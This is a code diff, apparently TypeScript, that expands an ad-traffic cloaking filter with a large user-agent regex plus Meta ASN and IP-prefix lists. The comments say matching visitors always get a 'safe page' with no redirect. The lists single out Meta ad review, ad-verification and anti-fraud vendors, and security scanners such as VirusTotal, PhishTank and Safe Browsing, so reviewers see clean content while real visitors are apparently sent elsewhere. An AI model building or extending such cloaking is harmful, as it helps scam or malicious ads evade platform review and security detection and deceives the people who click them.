@@ -14,9 +14,78 @@ let localEnvLoaded = false;
 const SNIPPET_CACHE: { items: Snip[]; expires: number } = { items: [], expires: 0 };
 const SNIPPET_TTL_MS = 120_000;
 
-const HARD_BOT_UA =
-  /facebookexternalhit|facebookcatalog|facebot|meta-externalagent|meta-externalfetcher|metafetcher|whatsapp|telegrambot|slackbot|discordbot|twitterbot|linkedinbot|pinterest|skypeuripreview|googlebot|bingbot|yandexbot|duckduckbot|baiduspider|applebot|petalbot|semrushbot|ahrefsbot|mj12bot|dotbot|headlesschrome|phantomjs|puppeteer|playwright|chrome-lighthouse|curl|wget|python-requests|httpclient|axios\/|go-http-client|java\/|okhttp|node-fetch/i;
-const META_ASNS = new Set(["32934", "63293", "54115", "149642"]);
+// ---------------------------------------------------------------------------
+// HARD BOT UA — the ONLY UA layer that can force a visitor to the safe page.
+// Grouped so it stays auditable. Every entry is a non-human agent: no real
+// Chrome/Safari/Firefox/in-app browser UA can match any of these tokens.
+// ---------------------------------------------------------------------------
+const HARD_BOT_UA = new RegExp(
+  [
+    // --- Meta / Facebook / Instagram / WhatsApp (ad review + link preview) ---
+    "facebookexternalhit", "facebookcatalog", "facebookscraper", "facebookplatform",
+    "facebookbot", "facebookads", "facebook_ads", "facebot", "fbav_crawler",
+    "meta-externalagent", "meta-externalfetcher", "metafetcher", "meta-crawler",
+    "metainspector", "instagram\\s?bot", "whatsapp",
+    // --- other social / messenger previewers ---
+    "telegrambot", "slackbot", "slack-imgproxy", "discordbot", "twitterbot",
+    "linkedinbot", "pinterest(bot)?", "redditbot", "tumblr", "vkshare",
+    "viberurldownloader", "line-?podcast", "skypeuripreview",
+    "quora link preview", "flipboard", "nuzzel", "outbrain", "taboola",
+    "embedly", "iframely", "w3c_validator", "developers\\.google\\.com/\\+/web/snippet",
+    // --- search engines ---
+    "googlebot", "google-inspectiontool", "google-read-aloud", "googleother",
+    "google-extended", "storebot-google", "adsbot-google", "mediapartners-google",
+    "feedfetcher-google", "apis-google", "bingbot", "bingpreview", "adidxbot",
+    "msnbot", "yandex(bot|images|mobilebot)", "duckduckbot",
+    "baiduspider", "sogou\\s?(web|inst)?\\s?spider", "exabot", "seznambot",
+    "naverbot", "yeti\\/", "coccocbot",
+    "applebot", "petalbot", "qwantify", "gigabot", "ia_archiver", "archive\\.org_bot",
+    // --- SEO / marketing crawlers ---
+    "semrushbot", "ahrefsbot", "ahrefssiteaudit", "mj12bot", "dotbot", "rogerbot",
+    "screaming frog", "sitebulb", "blexbot", "seokicks", "serpstatbot", "dataforseo",
+    "megaindex", "linkdexbot", "spbot", "zoominfobot", "netcraftsurveyagent",
+    "barkrowler", "cocolyzebot", "seostar", "sistrix", "similartech", "builtwith",
+    // --- AI / LLM crawlers ---
+    "gptbot", "oai-searchbot", "chatgpt-user", "claudebot", "claude-web", "anthropic-ai",
+    "perplexitybot", "youbot", "ccbot", "bytespider", "amazonbot", "applebot-extended",
+    "diffbot", "omgili", "img2dataset", "timpibot", "cohere-ai",
+    // --- ad-verification / compliance / anti-fraud vendors (ad-reject risk) ---
+    "geoedge", "adsecure", "confiant", "clean\\.io", "cleanad", "thebrowser\\.io",
+    "integralads", "iasbot", "doubleverify", "dvbot", "moatbot", "pixalate",
+    "forensiq", "anura", "trafficguard", "adloox", "protectmedia", "fraudlogix",
+    "whiteops", "humansecurity", "adlibrary", "adscanner", "brandverity",
+    "trustpid", "riskiq", "domaintools",
+    // --- security scanners / sandboxes ---
+    "virustotal", "urlscan", "phishtank", "safebrowsing", "sucuri", "netcraft",
+    "qualys", "nessus", "openvas", "acunetix", "nikto", "zgrab", "masscan",
+    "censys", "shodan", "internet-measurement", "paloaltonetworks", "zscaler",
+    "trendmicro", "kaspersky", "avast", "bitdefender", "webshield", "cyberpatrol",
+    // --- headless / automation ---
+    "headlesschrome", "headless", "phantomjs", "electron", "puppeteer", "playwright",
+    "selenium", "webdriver", "cypress", "chrome-lighthouse", "pagespeed",
+    "gtmetrix", "webpagetest", "browserless", "splash", "htmlunit", "jsdom",
+    "prerender", "rendertron", "cheerio",
+    // --- HTTP clients / libraries ---
+    "curl", "wget", "libwww", "lwp::simple", "python-requests", "python-urllib",
+    "python-httpx", "aiohttp", "scrapy", "mechanize", "httpclient", "http_request",
+    "axios\\/", "got\\/", "undici", "node-fetch", "go-http-client", "java\\/",
+    "jakarta", "okhttp", "apache-httpclient", "restsharp", "guzzlehttp", "php",
+    "ruby", "perl", "powershell", "dart\\/", "postman", "insomnia", "httpie",
+    "haskell", "rust-reqwest",
+    // --- monitoring / uptime / feed / misc ---
+    "uptimerobot", "pingdom", "statuscake", "site24x7", "newrelicpinger",
+    "datadog", "nagios", "zabbix", "monitis", "hetrixtool", "betteruptime",
+    "feedly", "feedburner", "rssbot", "superfeedr", "newsblur",
+    "lighthouse", "chrome privacy preserving", "wappalyzer", "cloudflare-traffic-manager",
+    "ltx71", "researchscan", "yacybot",
+    // --- generic catch-all (never present in real browser UAs) ---
+    "crawler", "crawling", "spider", "scraper", "scraping", "fetcher", "indexer",
+    "\\bbot\\b", "[a-z0-9_.-]bot[/ ]", "bot$", "robot",
+  ].join("|"),
+  "i",
+);
+const META_ASNS = new Set(["32934", "63293", "54115", "149642", "394192"]);
+
 const DC_ASNS = new Set([
   "16509",
   "14618",
@@ -43,9 +112,9 @@ const DC_ASNS = new Set([
 const META_V6 = ["2a03:2880", "2620:0:1c00", "2401:db00", "2803:6080"];
 // IPv4 /16 Meta scraper prefixes — any hit is Facebook/Instagram, always serve safe (no 302)
 const META_V4 = [
-  "31.13.", "66.220.", "69.63.", "69.171.", "74.119.",
-  "103.4.", "129.134.", "157.240.", "173.252.", "179.60.",
-  "185.60.", "204.15.",
+  "31.13.", "45.64.40.", "66.220.", "69.63.", "69.171.", "74.119.",
+  "102.132.", "103.4.96.", "129.134.", "147.75.208.", "157.240.",
+  "163.114.", "173.252.", "179.60.", "185.60.", "199.201.64.", "204.15.",
 ];
 const MOBILE_UA = /android|iphone|ipad|ipod|mobile|silk|kindle|opera mini|opera mobi|blackberry|windows phone/i;
 const ALLOWED_BACKEND_HOSTS = new Set(["api.adspx.com"]);
